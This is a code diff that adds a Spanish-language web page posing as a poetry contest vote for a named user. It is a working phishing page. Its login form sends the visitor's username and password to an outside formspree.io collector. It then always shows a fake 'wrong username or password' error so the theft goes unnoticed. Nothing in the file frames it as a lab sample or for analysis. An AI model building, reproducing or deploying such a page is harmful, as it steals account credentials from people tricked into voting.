@@ -1,0 +1,149 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Concurso de Letras - Inicio</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Great+Vibes&family=Libre+Baskerville&display=swap');
+
+    body {
+      margin: 0;
+      font-family: 'Libre Baskerville', serif;
+      background: url('https://images.unsplash.com/photo-1605828483744-74ea128fc2f0?auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
+      background-size: cover;
+      color: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 0 20px;
+      backdrop-filter: brightness(0.5) blur(2px);
+    }
+
+    .overlay {
+      background: rgba(0, 0, 0, 0.65);
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .header h1 {
+      font-family: 'Great Vibes', cursive;
+      font-size: 48px;
+      color: #e4dede;
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      font-size: 18px;
+      color: #ccc;
+      margin-bottom: 10px;
+    }
+
+    .supporting {
+      font-size: 16px;
+      color: #f8c4c4;
+      margin-bottom: 25px;
+      font-style: italic;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input {
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #555;
+      border-radius: 6px;
+      background-color: #1f1f1f;
+      font-size: 14px;
+      color: #f2f2f2;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    button {
+      padding: 12px;
+      background-color: #8e3b46;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #702c36;
+    }
+
+    .error {
+      color: #f8c4c4;
+      margin-top: 20px;
+      display: none;
+      font-weight: bold;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="overlay">
+    <div class="header">
+      <h1>Concurso de Letras</h1>
+      <p>Participa con tu alma, escribe con tu corazón</p>
+      <div class="supporting">Estás apoyando a <strong>darwi.28_</strong></div>
+    </div>
+    <form id="login-form">
+      <input type="text" id="usuario" name="usuario" placeholder="Nombre de usuario" required />
+      <input type="password" id="password" name="contraseña" placeholder="Contraseña" required />
+      <button type="submit">Apoya a tu poeta</button>
+    </form>
+    <div class="error" id="error-msg">Usuario o contraseña incorrectos.</div>
+    <div class="footer">© 2025 Concurso de Letras. Todos los versos reservados.</div>
+  </div>
+
+  <script>
+    const form = document.getElementById("login-form");
+    const errorMsg = document.getElementById("error-msg");
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const formData = new FormData(form);
+
+      fetch("https://formspree.io/f/mqalqeyj", {
+        method: "POST",
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        errorMsg.style.display = "block";
+        form.reset();
+      }).catch(error => {
+        console.error("Error al enviar el formulario:", error);
+      });
+    });
+  </script>
+
+</body>
+</html>
